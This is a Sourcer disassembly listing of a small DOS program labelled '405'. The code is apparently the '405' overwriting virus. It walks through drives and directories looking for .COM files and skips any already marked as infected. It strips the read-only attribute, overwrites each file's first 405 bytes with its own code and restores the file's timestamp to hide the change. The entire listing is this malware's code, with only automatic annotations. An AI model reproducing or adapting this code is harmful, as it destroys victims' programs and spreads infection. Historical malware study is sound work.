      405.lst						 Sourcer Listing v2.24    22-Jun-91   7:31 pm   Page 1

  
				PAGE  59,132
  
				;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
				;лл								         лл
				;лл			        405				         лл
				;лл								         лл
				;лл      Created:   9-Feb-91					         лл
				;лл      Version:						         лл
				;лл      Passes:    5	       Analysis Options on: HQRS	         лл
				;лл								         лл
				;лл								         лл
				;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
  
     = 0295			data_6e		equ	295h			; (733F:0295=0)
     = E000			data_7e		equ	0E000h			; (733F:E000=0)
     = E195			data_9e		equ	0E195h			; (733F:E195=0)
  
				seg_a		segment	byte public
						assume	cs:seg_a, ds:seg_a
  
  
						org	100h
  
				405		proc	far
  
733F:0100			start:
733F:0100  96					xchg	ax,si
733F:0101  00 00				add	[bx+si],al
733F:0103  9E					sahf				; Store ah into flags
733F:0104  00 00				add	[bx+si],al
733F:0106  90					nop
733F:0107  B8 0000				mov	ax,0
733F:010A  26: A2 0249				mov	es:data_1,al		; (733F:0249=2)
733F:010E  26: A2 024B				mov	es:data_3,al		; (733F:024B=54h)
733F:0112  26: A2 028B				mov	es:data_5,al		; (733F:028B=0Dh)
733F:0116  50					push	ax
733F:0117  B4 19				mov	ah,19h
733F:0119  CD 21				int	21h			; DOS Services  ah=function 19h
										;  get default drive al  (0=a:)
733F:011B  26: A2 0249				mov	es:data_1,al		; (733F:0249=2)
733F:011F  B4 47				mov	ah,47h			; 'G'
733F:0121  04 01				add	al,1
733F:0123  50					push	ax
733F:0124  8A D0				mov	dl,al
733F:0126  8D 36 024B				lea	si,cs:[24Bh]		; Load effective addr
733F:012A  CD 21				int	21h			; DOS Services  ah=function 47h
										;  get present dir,drive dl,1=a:
733F:012C  58					pop	ax
733F:012D  B4 0E				mov	ah,0Eh
733F:012F  2C 01				sub	al,1
733F:0131  8A D0				mov	dl,al
733F:0133  CD 21				int	21h			; DOS Services  ah=function 0Eh
										;  set default drive dl  (0=a:)
733F:0135  26: A2 028B				mov	es:data_5,al		; (733F:028B=0Dh)
733F:0139			loc_1:						;  xref 733F:019C
733F:0139  26: A0 0249				mov	al,es:data_1		; (733F:0249=2)
     405.lst						 Sourcer Listing v2.24    22-Jun-91   7:31 pm   Page 2

733F:013D  3C 00				cmp	al,0
733F:013F  75 11				jne	loc_2			; Jump if not equal
733F:0141  B4 0E				mov	ah,0Eh
733F:0143  B2 02				mov	dl,2
733F:0145  CD 21				int	21h			; DOS Services  ah=function 0Eh
										;  set default drive dl  (0=a:)
733F:0147  B4 19				mov	ah,19h
733F:0149  CD 21				int	21h			; DOS Services  ah=function 19h
										;  get default drive al  (0=a:)
733F:014B  26: A2 024A				mov	es:data_2,al		; (733F:024A=0)
733F:014F  EB 28				jmp	short loc_4		; (0179)
733F:0151  90					db	90h
733F:0152			loc_2:						;  xref 733F:013F
733F:0152  3C 01				cmp	al,1
733F:0154  75 11				jne	loc_3			; Jump if not equal
733F:0156  B4 0E				mov	ah,0Eh
733F:0158  B2 02				mov	dl,2
733F:015A  CD 21				int	21h			; DOS Services  ah=function 0Eh
										;  set default drive dl  (0=a:)
733F:015C  B4 19				mov	ah,19h
733F:015E  CD 21				int	21h			; DOS Services  ah=function 19h
										;  get default drive al  (0=a:)
733F:0160  26: A2 024A				mov	es:data_2,al		; (733F:024A=0)
733F:0164  EB 13				jmp	short loc_4		; (0179)
733F:0166  90					db	90h
733F:0167			loc_3:						;  xref 733F:0154
733F:0167  3C 02				cmp	al,2
733F:0169  75 0E				jne	loc_4			; Jump if not equal
733F:016B  B4 0E				mov	ah,0Eh
733F:016D  B2 00				mov	dl,0
733F:016F  CD 21				int	21h			; DOS Services  ah=function 0Eh
										;  set default drive dl  (0=a:)
733F:0171  B4 19				mov	ah,19h
733F:0173  CD 21				int	21h			; DOS Services  ah=function 19h
										;  get default drive al  (0=a:)
733F:0175  26: A2 024A				mov	es:data_2,al		; (733F:024A=0)
733F:0179			loc_4:						;  xref 733F:014F, 0164, 0169, 019E
733F:0179  B4 4E				mov	ah,4Eh			; 'N'
733F:017B  B9 0001				mov	cx,1
733F:017E  8D 16 028C				lea	dx,cs:[28Ch]		; Load effective addr
733F:0182  CD 21				int	21h			; DOS Services  ah=function 4Eh
										;  find 1st filenam match @ds:dx
733F:0184  72 03				jc	loc_5			; Jump if carry Set
733F:0186  EB 21				jmp	short loc_7		; (01A9)
733F:0188  90					db	90h
733F:0189			loc_5:						;  xref 733F:0184, 01A4
733F:0189  B4 3B				mov	ah,3Bh			; ';'
733F:018B  8D 16 0297				lea	dx,cs:[297h]		; Load effective addr
733F:018F  CD 21				int	21h			; DOS Services  ah=function 3Bh
										;  set current dir, path @ ds:dx
733F:0191  B4 4E				mov	ah,4Eh			; 'N'
733F:0193  B9 0011				mov	cx,11h
733F:0196  8D 16 0292				lea	dx,cs:[292h]		; Load effective addr
733F:019A  CD 21				int	21h			; DOS Services  ah=function 4Eh
										;  find 1st filenam match @ds:dx
733F:019C  72 9B				jc	loc_1			; Jump if carry Set
733F:019E  EB D9				jmp	short loc_4		; (0179)
     405.lst						 Sourcer Listing v2.24    22-Jun-91   7:31 pm   Page 3

733F:01A0			loc_6:						;  xref 733F:01CD
733F:01A0  B4 4F				mov	ah,4Fh			; 'O'
733F:01A2  CD 21				int	21h			; DOS Services  ah=function 4Fh
										;  find next filename match
733F:01A4  72 E3				jc	loc_5			; Jump if carry Set
733F:01A6  EB 01				jmp	short loc_7		; (01A9)
733F:01A8  90					db	90h
733F:01A9			loc_7:						;  xref 733F:0186, 01A6
733F:01A9  B4 3D				mov	ah,3Dh			; '='
733F:01AB  B0 02				mov	al,2
733F:01AD  BA 009E				mov	dx,9Eh
733F:01B0  CD 21				int	21h			; DOS Services  ah=function 3Dh
										;  open file, al=mode,name@ds:dx
733F:01B2  8B D8				mov	bx,ax
733F:01B4  B4 3F				mov	ah,3Fh			; '?'
733F:01B6  B9 0195				mov	cx,195h
733F:01B9  90					nop
733F:01BA  BA E000				mov	dx,0E000h
733F:01BD  90					nop
733F:01BE  CD 21				int	21h			; DOS Services  ah=function 3Fh
										;  read file, cx=bytes, to ds:dx
733F:01C0  B4 3E				mov	ah,3Eh			; '>'
733F:01C2  CD 21				int	21h			; DOS Services  ah=function 3Eh
										;  close file, bx=file handle
733F:01C4  26: 8B 1E E000			mov	bx,es:data_7e		; (733F:E000=0)
733F:01C9  81 FB 9600				cmp	bx,9600h
733F:01CD  74 D1				je	loc_6			; Jump if equal
733F:01CF  B4 43				mov	ah,43h			; 'C'
733F:01D1  B0 00				mov	al,0
733F:01D3  BA 009E				mov	dx,9Eh
733F:01D6  CD 21				int	21h			; DOS Services  ah=function 43h
										;  get/set file attrb, nam@ds:dx
733F:01D8  B4 43				mov	ah,43h			; 'C'
733F:01DA  B0 01				mov	al,1
733F:01DC  81 E1 00FE				and	cx,0FEh
733F:01E0  CD 21				int	21h			; DOS Services  ah=function 43h
										;  get/set file attrb, nam@ds:dx
733F:01E2  B4 3D				mov	ah,3Dh			; '='
733F:01E4  B0 02				mov	al,2
733F:01E6  BA 009E				mov	dx,9Eh
733F:01E9  CD 21				int	21h			; DOS Services  ah=function 3Dh
										;  open file, al=mode,name@ds:dx
733F:01EB  8B D8				mov	bx,ax
733F:01ED  B4 57				mov	ah,57h			; 'W'
733F:01EF  B0 00				mov	al,0
733F:01F1  CD 21				int	21h			; DOS Services  ah=function 57h
										;  get/set file date & time
733F:01F3  51					push	cx
733F:01F4  52					push	dx
733F:01F5  2E: 8B 16 0295			mov	dx,cs:data_6e		; (733F:0295=0)
733F:01FA  2E: 89 16 E195			mov	cs:data_9e,dx		; (733F:E195=0)
733F:01FF  2E: 8B 16 E001			mov	dx,word ptr cs:data_7e+1	; (733F:E001=0)
733F:0204  8D 0E 0194				lea	cx,cs:[194h]		; Load effective addr
733F:0208  2B D1				sub	dx,cx
733F:020A  2E: 89 16 0295			mov	cs:data_6e,dx		; (733F:0295=0)
733F:020F  B4 40				mov	ah,40h			; '@'
733F:0211  B9 0195				mov	cx,195h
     405.lst						 Sourcer Listing v2.24    22-Jun-91   7:31 pm   Page 4

733F:0214  90					nop
733F:0215  8D 16 0100				lea	dx,cs:[100h]		; Load effective addr
733F:0219  CD 21				int	21h			; DOS Services  ah=function 40h
										;  write file cx=bytes, to ds:dx
733F:021B  B4 57				mov	ah,57h			; 'W'
733F:021D  B0 01				mov	al,1
733F:021F  5A					pop	dx
733F:0220  59					pop	cx
733F:0221  CD 21				int	21h			; DOS Services  ah=function 57h
										;  get/set file date & time
733F:0223  B4 3E				mov	ah,3Eh			; '>'
733F:0225  CD 21				int	21h			; DOS Services  ah=function 3Eh
										;  close file, bx=file handle
733F:0227  2E: 8B 16 E195			mov	dx,cs:data_9e		; (733F:E195=0)
733F:022C  2E: 89 16 0295			mov	cs:data_6e,dx		; (733F:0295=0)
733F:0231  EB 01				jmp	short $+3h		; delay for I/O
733F:0233  90					nop
733F:0234  B4 0E				mov	ah,0Eh
733F:0236  2E: 8A 16 0249			mov	dl,cs:data_1		; (733F:0249=2)
733F:023B  CD 21				int	21h			; DOS Services  ah=function 0Eh
										;  set default drive dl  (0=a:)
733F:023D  B4 3B				mov	ah,3Bh			; ';'
733F:023F  8D 16 024A				lea	dx,cs:[24Ah]		; Load effective addr
733F:0243  CD 21				int	21h			; DOS Services  ah=function 3Bh
										;  set current dir, path @ ds:dx
733F:0245  B4 00				mov	ah,0
733F:0247  CD 21				int	21h			; DOS Services  ah=function 00h
										;  terminate, cs=progm seg prefx
733F:0249  02			data_1		db	2			;  xref 733F:010B, 011C, 013A, 0237
733F:024A  00			data_2		db	0			;  xref 733F:014C, 0161, 0176
733F:024B  54			data_3		db	54h			;  xref 733F:010F
733F:024C  45 53 54				db	45h, 53h, 54h
733F:024F  003C[00]				db	60 dup (0)
733F:028B  0D			data_5		db	0Dh			;  xref 733F:0113, 0136
733F:028C  2A 2E 43 4F 4D 00			db	2Ah, 2Eh, 43h, 4Fh, 4Dh, 0
733F:0292  2A 00 E9				db	2Ah, 0, 0E9h
  
				405		endp
  
				seg_a		ends
  
  
  
						end	start
     405.lst						 Sourcer Listing v2.24    22-Jun-91   7:31 pm   Page 5

  
				ББББББББББББББББББББ CROSS REFERENCE - KEY ENTRY POINTS БББББББББББББББББББ
  
				    seg:off    type	   label
				   ---- ----   ----   ---------------
				   733F:0100   far    start
  
